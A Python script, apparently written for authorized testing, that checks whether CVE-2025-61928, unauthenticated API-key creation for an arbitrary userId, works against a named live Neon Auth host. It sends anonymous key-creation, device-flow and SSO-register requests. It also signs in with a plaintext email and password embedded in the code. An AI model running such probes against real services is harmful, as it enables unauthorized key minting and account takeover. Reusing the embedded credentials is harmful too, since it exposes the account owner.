# -*- coding: utf-8 -*-
"""CVE-2025-61928 适用性验证:未认证 POST /api-key/create(任意 userId)
na2 是自己的测试用户,key 用完即删;零破坏"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
NA2_UID = '8e3f631f-3ec6-4d71-b580-195b52a30ab3'

def req(method, path, body=None, cookie=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
        if cookie:
            h['Cookie'] = cookie
        conn.request(method, '/neondb/auth' + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        hdrs = dict((k.lower(), v) for k, v in r.getheaders())
        conn.close()
        return st, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}

print('=== [1] 匿名 api-key/create 矩阵 ===', flush=True)
bodies = [
    ('empty', {}),
    ('uid=na2', {'userId': NA2_UID}),
    ('uid+name', {'userId': NA2_UID, 'name': 'sec-n9-probe'}),
    ('uid+exp', {'userId': NA2_UID, 'name': 'sec-n9-probe', 'expiresIn': 3600}),
    ('no-uid-name', {'name': 'sec-n9-probe'}),
]
for name, b in bodies:
    st, raw, hdrs = req('POST', '/api-key/create', b)
    sc = hdrs.get('set-cookie', '')
    print('[%s] -> %d %s %s' % (name, st, raw[:250].replace('\n', ' '), ('SC:' + sc[:60]) if sc else ''), flush=True)
    time.sleep(0.4)

print('\n=== [2] 匿名 api-key 主端点(带 body 变体) ===', flush=True)
for path, b in [
    ('/api-key', {'userId': NA2_UID}),
    ('/api-key', {}),
    ('/api-keys', {'userId': NA2_UID}),
]:
    st, raw, _ = req('POST', path, b)
    print('[POST %s %s] -> %d %s' % (path, json.dumps(b)[:60], st, raw[:220].replace('\n', ' ')), flush=True)
    time.sleep(0.3)

print('\n=== [3] 认证对照(na2 登录后 create) ===', flush=True)
st0, raw0, hdrs0 = req('POST', '/sign-in/email',
                       {'email': 'libobo1229+na2@gmail.com', 'password': 'SecTest!2026pass2'},
                       cookie=None)
# sign-in 无 cookie 参数,直接请求
st0, raw0, hdrs0 = req('POST', '/sign-in/email',
                       {'email': 'libobo1229+na2@gmail.com', 'password': 'SecTest!2026pass2'})
sc0 = hdrs0.get('set-cookie', '')
ck = ''
for part in sc0.split(','):
    kv = part.strip().split(';')[0]
    if '=' in kv:
        k, v = kv.split('=', 1)
        ck = ck + ('; ' if ck else '') + '%s=%s' % (k.strip(), v.strip())
print('sign-in:', st0, 'ck:', ck[:80], flush=True)
if ck:
    st1, raw1, _ = req('POST', '/api-key/create', {'name': 'sec-n9-auth'}, cookie=ck)
    print('[auth create] -> %d %s' % (st1, raw1[:250].replace('\n', ' ')), flush=True)
    # 清理:若创建成功拿 key id delete
    try:
        d = json.loads(raw1)
        kid = None
        if isinstance(d, dict):
            kd = d.get('data') or d.get('key') or d
            kid = (kd.get('id') if isinstance(kd, dict) else None)
        if kid:
            st2, raw2, _ = req('POST', '/api-key/delete', {'id': kid}, cookie=ck)
            print('[auth delete %s] -> %d %s' % (kid, st2, raw2[:150]), flush=True)
    except Exception as e:
        print('cleanup note:', e, flush=True)

print('\n=== [4] device-flow 匿名 ===', flush=True)
for path, b in [
    ('/device-flow/authorize', {}),
    ('/device-flow/authorize', {'clientId': 'test'}),
    ('/device-flow', {}),
    ('/device-flow/verify', {'code': '000000'}),
]:
    st, raw, _ = req('POST', path, b)
    print('[%s %s] -> %d %s' % (path, json.dumps(b)[:50], st, raw[:220].replace('\n', ' ')), flush=True)
    time.sleep(0.3)

print('\n=== [5] sso/register 匿名 ===', flush=True)
for b in [
    {'domain': 'sec-n9-test.com'},
    {'domain': 'sec-n9-test.com', 'providerId': 'oidc'},
    {},
]:
    st, raw, _ = req('POST', '/sso/register', b)
    print('[sso %s] -> %d %s' % (json.dumps(b)[:60], st, raw[:250].replace('\n', ' ')), flush=True)
    time.sleep(0.3)
